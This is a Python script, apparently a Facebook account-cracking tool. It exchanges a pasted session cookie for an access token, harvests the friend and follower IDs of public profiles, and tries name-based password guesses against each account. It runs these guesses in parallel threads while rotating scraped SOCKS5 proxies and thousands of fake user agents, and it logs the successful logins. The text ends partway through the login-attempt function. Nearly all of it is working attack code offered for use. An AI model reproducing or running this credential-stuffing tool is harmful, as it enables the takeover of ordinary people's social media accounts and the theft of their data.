# Modul
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64,uuid
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()

now = datetime.datetime.today()

now = datetime.datetime.today()
mmmm = str(now.month)
dddd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t=(mmmm + "/" + dddd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)


hours = (now.hour)
x = datetime.datetime.now()
g= datetime.datetime(2030, 10, 2, 1, 00 ,0)

if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("    "+ 'TOOL HAS BEEN EXPERT\nBO KRINI TOOL NAMA BNERA BO‌  @malashafiq \n Channel @python_coder_tools')
 print('\n\n')
 print(x)
 
 sys.exit(0)
 

if (x.strftime("%x"))==(g.strftime("%x")):
   print('')
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    print("    "+ 'TOOL HAS BEEN EXPERT\nBO KRINI TOOL NAMA BNERA BO‌  @malashafiq \n Channel @python_coder_tools ')
    print('\n\n')
    print(x)
    
    sys.exit(0)
   else:
    print('')  
else:
    print('')
print('')


os.system('clear')

#useragent
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(2000):
    ###1
    aa='Mozilla/5.0 (Android; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Nokia 1000 4G Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/603.42 (KHTML, like Gecko)  Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(1200,2900)
    k=random.randrange(200,350)
    l='Mobile Safari/602.6'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    ###2
    
    aa='Mozilla/5.0 (Android; '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Nokia 3310 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/535.38 (KHTML, like Gecko)  Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(2200,3900)
    k=random.randrange(200,350)
    l='Mobile Safari/537.1'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    ###3
    
    
    aa='Mozilla/5.0 (Linux; U; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Nokia 1000 4G Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.20 (KHTML, like Gecko)  Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(2200,3900)
    k=random.randrange(200,350)
    l='Mobile Safari/602.3'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    ###4
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Nokia 3315 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.5 (KHTML, like Gecko)  Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(2200,3900)
    k=random.randrange(200,350)
    l='Mobile Safari/601.5'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    ###5
    aa='Mozilla/5.0 (Linux; U; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Nokia 3210 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/533.25 (KHTML, like Gecko)  Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(2200,3900)
    k=random.randrange(200,350)
    l='Mobile Safari/534.0'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    rr = random.randrange
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android {str(rr(4,11))}; Nokia 1000 LTE Build/GRK39F) AppleWebKit/536.27 (KHTML, like Gecko)  Chrome/ {str(rr(73,99))}.0.{str(rr(3500,4900))}.{str(rr(75,150))} Mobile Safari/533.7"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(4,11))}; Nokia 1100 4G Build/GRK39F) AppleWebKit/537.18 (KHTML, like Gecko)  Chrome/ {str(rr(75,150))}.0.{str(rr(2111,2999))}.{str(rr(73,99))} Mobile Safari/534.8"
    tiga  = f"Mozilla/5.0 (Linux; Android {str(rr(5,12))}; Nokia 1100 LTE Build/GRK39F) AppleWebKit/600.15 (KHTML, like Gecko)  Chrome/{str(rr(75,150))}.0.{str(rr(2111,2999))}.{str(rr(73,99))} Mobile Safari/602.9"
    empat  = f"Mozilla/5.0 (Linux; Android {str(rr(4,11))}; Nokia 3215 Build/IMM76D) AppleWebKit/535.41 (KHTML, like Gecko)  Chrome/ {str(rr(75,150))}.0.{str(rr(3111,3999))}.{str(rr(73,99))} Mobile Safari/534.4"
    lima  = f"Mozilla/5.0 (Android; Android {str(rr(4,11))}; Nokia 3410 Build/IMM76D) AppleWebKit/600.24 (KHTML, like Gecko)  Chrome/ {str(rr(75,150))}.0.{str(rr(2111,2999))}.{str(rr(73,99))} Mobile Safari/537.0"
    uaku2 = str(rc([satu,dua,tiga,empat,lima]))
    ugen2.append(uaku2)
    
    
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('mr.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/mrbx001/MRBX-5/blob/main/mr.txt').text
		ua=open('.mr.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.mr.txt','r').read().splitlines()
# INDICATION
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

def MR4X1(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		MRBX = '2008-2009'
	elif len(fx)==8:
		MRBX = '2007-2008'
	elif len(fx)==7:
		MRBX = '2006-2007'
	else:MRBX=''
	return MRBX

import os, platform, time, sys

# COLOUR 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m'
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m'
p = '\x1b[0;34m' 
asu = random.choice([m,k,h,u,b])
# CONVERTER
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def by1551(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
# LOGO
def banner():
	clear()
	by1551(f'''\t
	     

    _      ______     ______       _     
  /' \    /\  ___\   /\  ___\    /' \    
 /\_, \   \ \ \__/   \ \ \__/   /\_, \   
 \/_/\ \   \ \___``\  \ \___``\ \/_/\ \  
    \ \ \   \/\ \L\ \  \/\ \L\ \   \ \ \ 
     \ \_\   \ \____/   \ \____/    \ \_\

                                         

                                                               
''')
# LOGIN
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			ma = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			ma2 = json.loads(ma.text)['name']
			ma3 = json.loads(ma.text)['id']
			menu(ma2,ma3)
		except KeyError:
			login_c()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='purple')
			exit()
	except IOError:
		login_c()
def login_c():
	try:
		os.system('clear')
		banner()
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		banner()
		your_cookies = input(' Cookie :  ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(" ╰─  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n ╰─  Token : {access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print("\n ╰─  Cookies Succses CTRL+P To Restart");exit()
			except Exception as e:
				print(" ╰─  Cookies Mokad Kontol")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
# MAIN MENU
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('%s[%s✘%s]%s Cookies Expired '%(N,H,N,M))
		time.sleep(5)
		login_c()
	os.system('clear')
	banner()
	print('        \n    [\033[1;97m\033[1;41m  1551 TEAM   \033[0m\033[1;93m]\n')
#	print("\x1b[1;92m[\x1b[0m✔\x1b[1;92m] \x1b[0m Telegram : "+str(my_id)) 
#	print("\x1b[1;92m[\x1b[0m✔\x1b[1;92m] \x1b[0m Name    : "+str(my_name))
	try:
#		gep = requests.get('http://ipinfo.io/json').json()
		by1551(f"%s%s📎%s%s  Region  :%s %s"%(H,P,H,P,K,gep['region']))
		by1551(f"%s%s👑%s%s  Ip      :%s %s\n"%(H,P,H,P,K,gep['ip']))
	
	except:
		by1551(f"%s%s📎%s%s Telegram :%s @python_coder_tools"%(H,P,H,P,K))
		by1551("f%s%s👑%s%s Made :%s MALA SHAFIQ"%(H,P,H,P,K))
	by1551(f'\n    [\033[1;97m\033[1;41m  MENU   \033[0m\033[1;93m]\n')
	by1551(f'%s[%s1%s]%s PUBLIC CRACK %s%sON%s'%(P,H,P,H,P,H,P))	
	by1551(f'%s[%sA%s]%s CONTACT : @malashafiq %s%s%s'%(P,H,P,H,P,H,P))
	by1551(f'%s[%sB%s]%s EXIT %s%s%s'%(P,H,P,H,P,H,P))
	MRBX = input('%s[%s?%s]%s Select %s : '%(N,H,N,H,M))
	if MRBX in ['1','01']:
		public()
	elif MRBX in ['A','a']:
		os.system('xdg-open https://t.me@malashafiq');menu(my_name,my_id)
	elif MRBX in ['B','b']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('[] Connection Is Over ')
		exit()
# PUBLIC CRACK
def public():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
         jum = int(input('[?] CRACK ID LIMIT : '))
	except ValueError:
		by1551(f'{k}[✘] NOT PUBLIC ID ')
		exit()
	if jum<1 or jum>100:
		by1551(f'[✘] Your limit error')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1		
		kl = input('[➤] INPUT PUBLIC ID'+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			by1551(f'{k}[✘] Error  ')
			exit()
	try:
		print('')
		by1551(f'All ID : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('<•> Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'<•>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()
# FOLLOWER CRACK
def follower():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	print('\n\x1b[1;30m%s[%smrbx%s]%s-----%s[%sMRBX%s]\n '%(H,P,H,P,H,P,H,))
	pil = input('[MRBX]  Inter User Id : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print('[•] Total Id :{h} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('[✘] No Connection  ')
		exit()
	except (KeyError,IOError):
		print('[✘] Followar Id Not Found  ')
		exit()

#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	os.system('clear')
	banner()

	if ['1','01']:
		os.system('1')
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		exit()
	clear()
	banner()
	method.append('mobile')
	clear()
	banner()
	if ['01','1']:
		os.system('1')
		su()
	
def su():
	bo = random.choice([m,k,h,b,u,p])
	print(f'''
\033[32m[1] PASSWORD  [ FAST ]
\033[32m[2] PASSWORD  [ NORMAL ]
''')
	print("\033[1;32m➣ \033[1;37m TOTAL ID : "+str(len(id)))
	ch = input('! \033[1;97m[\033[1;92m-\033[1;97m] CHOICE >> \033[1;97m  ')
	if ch in ['1','01']:
		passwrd()
	elif ch in ['2','02']:
		password2()
	else:
		passwrd()
		password2()
	
# password # 
    
# password 2#
	    
def passwrd():
	os.system('clear')
	banner()
	print("")
	print(f'\033[1;32m➣ \033[1;37m DATE : '+str(dddd)+'-'+str(mmmm)+'-'+str(yyyy)+'')
	print("\033[1;32m➣ \033[1;37m TOTAL ID : "+str(len(id)))
	print("")
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'1234567890')
					pwv.append("123"+frs)
					pwv.append("1234"+frs)
					pwv.append("12345"+frs)
					pwv.append("123456"+frs)
					pwv.append("1234567"+frs)
					pwv.append("12345678"+frs)
					pwv.append("123456789"+frs)
					pwv.append(frs+'123321')
					pwv.append(frs+'1122')
					pwv.append(frs+'112233')
					pwv.append(frs+'2023')
					pwv.append(frs+'2022')
					pwv.append(frs+'2021')
					pwv.append(frs+'2020')
					pwv.append(frs+'2008')
					pwv.append(frs+'2007')
					pwv.append(frs+'2006')
					pwv.append(frs+'2005')
					pwv.append(frs+'2004')
					pwv.append(frs+'2003')
					pwv.append(frs+'11223344')
					pwv.append(frs+'1122334455')
					pwv.append(frs+'112233445566')
					pwv.append(frs+frs)
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'1234567890')
					pwv.append("123"+frs)
					pwv.append("1234"+frs)
					pwv.append("12345"+frs)
					pwv.append("123456"+frs)
					pwv.append("1234567"+frs)
					pwv.append("12345678"+frs)
					pwv.append("123456789"+frs)
					pwv.append(frs+'123321')
					pwv.append(frs+'2023')
					pwv.append(frs+'2022')
					pwv.append(frs+'2021')
					pwv.append(frs+'2020')
					pwv.append(frs+'2008')
					pwv.append(frs+'2007')
					pwv.append(frs+'2006')
					pwv.append(frs+'2005')
					pwv.append(frs+'2004')
					pwv.append(frs+'2003')
					pwv.append(frs+'1122')
					pwv.append(frs+'112233')
					pwv.append(frs+'11223344')
					pwv.append(frs+'1122334455')
					pwv.append(frs+'112233445566')
					pwv.append(frs+frs)
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crackmobile_MRBX,idf,pwv,nmf)
			elif 'mbasic' in method:
				pool.submit(crackmbasic_MRBX,idf,pwv,nmf)
			else:
				pool.submit(crackfree,idf,pwv)
	print('')
	print(' \033[1;34m ALL OK = %s '%(ok))
	print('')
	print(' \033[1;37m ALL CP = %s '%(cp))
	print('')
	print('\033[1;34mBO DUBARA CRACK KRDN [CTRL + P] DAGRA')
	exit()
	
def password2():
	os.system('clear')
	banner()
	print("")
	print(f'\033[1;31m \033[1;37m DATE : '+str(dddd)+'-'+str(mmmm)+'-'+str(yyyy)+'')
	print("\033[1;31m \033[1;37m TOTAL ID : "+str(len(id)))
	print("")
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'0750')
					pwv.append(frs+'07500750')
					pwv.append(frs+'0780')
					pwv.append(frs+'07800780')
					pwv.append(frs+'0770')
					pwv.append(frs+'07700770')
					pwv.append(frs+'0751')
					pwv.append("123"+frs)
					pwv.append("1234"+frs)
					pwv.append("12345"+frs)
					pwv.append("123456"+frs)
					pwv.append("1234567"+frs)
					pwv.append("12345678"+frs)
					pwv.append("123456789"+frs)
					pwv.append(frs+'123321')
					pwv.append('07500750')
					pwv.append('07700770')
					pwv.append(frs+'1122')
					pwv.append(frs+'112233')
					pwv.append(frs+'11223344')
					pwv.append(frs+'1122334455')
					pwv.append(frs+'112233445566')
					pwv.append(frs+frs)
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'0750')
					pwv.append(frs+'07500750')
					pwv.append(frs+'0780')
					pwv.append(frs+'07800780')
					pwv.append(frs+'0770')
					pwv.append(frs+'07700770')
					pwv.append(frs+'0751')
					pwv.append("123"+frs)
					pwv.append("1234"+frs)
					pwv.append("12345"+frs)
					pwv.append("123456"+frs)
					pwv.append("1234567"+frs)
					pwv.append("12345678"+frs)
					pwv.append("123456789"+frs)
					pwv.append(frs+'123321')
					pwv.append('07500750')
					pwv.append('07700770')
					pwv.append(frs+'1122')
					pwv.append(frs+'112233')
					pwv.append(frs+'11223344')
					pwv.append(frs+'1122334455')
					pwv.append(frs+'112233445566')
					pwv.append(frs+frs)
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crackmobile_MRBX,idf,pwv,nmf)
			elif 'mbasic' in method:
				pool.submit(crackmbasic_MRBX,idf,pwv,nmf)
			else:
				pool.submit(crackfree,idf,pwv)
	print('')
#	print(' \033[1;34m OK = %s '%(ok))
	print('')
#	print(' \033[1;37m CP = %s '%(cp))
	print('\033[1;34mBO DUBARA CRACK KRDN [CTRL + P] DAGRA')
	exit()

# Mobile 
def crackmobile_MRBX(idf,pwv,nmf):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r{b}[1551 TEAM]{P}[{k}{loop}{P}/{h}{len(id)}{P}]-{P}[{H}OK - {ok}{P}]-{P}[{k}CP - {cp}{x}]-[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen2)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks5://'+nip}
            ses.headers.update = {'Host':'p.facebook.com',
	'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dark',
